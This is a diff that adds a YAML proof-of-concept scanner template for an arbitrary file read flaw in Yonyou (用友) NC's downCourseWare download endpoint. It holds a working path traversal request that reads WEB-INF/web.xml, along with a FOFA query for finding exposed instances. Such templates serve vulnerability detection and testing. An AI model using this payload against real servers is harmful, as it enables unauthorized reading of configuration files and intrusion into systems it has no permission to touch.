@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-nc-downcourseware-anyfile-read
+info:
+  name: 用友 NC downCourseWare 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login
+  expression: 'status_code == 200 &&
+
+    contains(body,"java.sun.com") &&
+
+    contains(body,"<listener>") &&
+
+    contains(body,"</web-app>") &&
+
+    contains(headers,"filename=")
+
+    '
+variables: {}
+transport: http
